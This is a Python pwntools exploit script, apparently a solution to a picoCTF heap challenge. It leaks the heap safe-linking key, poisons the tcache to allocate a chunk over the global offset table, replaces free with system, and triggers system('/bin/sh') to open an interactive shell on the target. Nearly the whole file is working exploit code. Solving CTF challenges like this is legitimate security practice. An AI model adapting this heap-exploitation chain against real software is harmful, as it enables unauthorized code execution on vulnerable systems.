#!/usr/bin/env python3
from pwn import *

PORT = 63559
HOST = "saturn.picoctf.net"

elf = context.binary = ELF("./vuln_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.timeout = 10

SIZE = 24

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return elf.process()

p = conn()

def add(idx, size, name):
    p.sendlineafter(b"Choice: ", b"1")
    p.sendlineafter(b"(0-17)? ", str(idx).encode())
    p.sendlineafter(b"length (16-256)? ", str(size).encode())
    p.sendlineafter(b"characters: ", name)


def remove(idx):
    p.sendlineafter(b"Choice: ", b"2")
    p.sendlineafter(b"(0-17)? ", str(idx).encode())


def cheat(idx, data, pos=0):
    p.sendlineafter(b"Choice: ", b"0")
    p.sendlineafter(b"(0-17)? ", str(idx).encode())
    p.sendlineafter(b"characters: ", data)
    p.sendlineafter(b"spot? ", str(pos).encode())


def race_leak_heap_key():
    p.sendlineafter(b"Choice: ", b"3")

    data = p.recvuntil(b"WINNER: ", drop=True)

    known_horses = [
        b"/bin/sh",
        b"C" * 16,
        b"D" * 16,
        b"E" * 16,
        b"X" * 16,
    ]

    leak = None

    for line in data.split(b"\n"):
        if b"|" not in line:
            continue

        candidate = line.rsplit(b"|", 1)[0].strip(b" ")

        if not candidate:
            continue

        if any(k in candidate for k in known_horses):
            continue

        leak = candidate
        break

    if leak is None:
        raise RuntimeError("heap leak failed")

    heap_key = u64(leak.ljust(8, b"\x00"))

    log.success(f"heap leak raw = {leak.hex()}")
    log.success(f"heap key      = {hex(heap_key)}")
    log.success(f"heap page     = {hex(heap_key << 12)}")

    # Consume winner line only. Leave menu prompt for next sendlineafter().
    p.recvline()

    return heap_key


def bad_bytes(x):
    return b"\x0a" in x or b"\xff" in x


free_got = elf.got["free"]
system_plt = elf.plt["system"]

target = free_got - 8
assert target % 0x10 == 0

log.info(f"free@got   = {hex(free_got)}")
log.info(f"target     = {hex(target)}")
log.info(f"system@plt = {hex(system_plt)}")

# Leak heap safe-linking key.
add(0, SIZE, b"A" * SIZE)
remove(0)

# Reuse freed chunk without overwriting tcache metadata.
add(1, SIZE, b"\xff")

# Prepare horses for race and command chunk.
add(2, SIZE, b"/bin/sh\x00".ljust(SIZE, b"X"))
add(3, SIZE, b"C" * SIZE)
add(4, SIZE, b"D" * SIZE)
add(5, SIZE, b"E" * SIZE)

heap_key = race_leak_heap_key()

# Need tcache count >= 2.
# Free order:
#   remove(1): chunk A
#   remove(3): chunk C becomes tcache head
remove(1)
remove(3)

encoded_fd = target ^ heap_key
encoded_fd_bytes = p64(encoded_fd)

if bad_bytes(encoded_fd_bytes):
    raise RuntimeError(f"bad encoded fd: {encoded_fd_bytes.hex()}")

log.success(f"encoded fd = {hex(encoded_fd)}")

# Poison tcache head.
cheat(3, encoded_fd_bytes.ljust(SIZE, b"\x00"), 0)

# malloc #1: get real chunk C
add(6, SIZE, b"B" * SIZE)

# malloc #2: get fake chunk at 0x404010.
# Write:
#   0x404010: junk
#   0x404018: system@plt = free@got
#
# Append 0xff to stop input before it null-terminates into next GOT entry.
payload = flat(
    p64(0),
    p64(system_plt),
) + b"\xff"

add(7, SIZE, payload)

# Trigger free("/bin/sh") -> system("/bin/sh")
remove(2)

p.interactive()
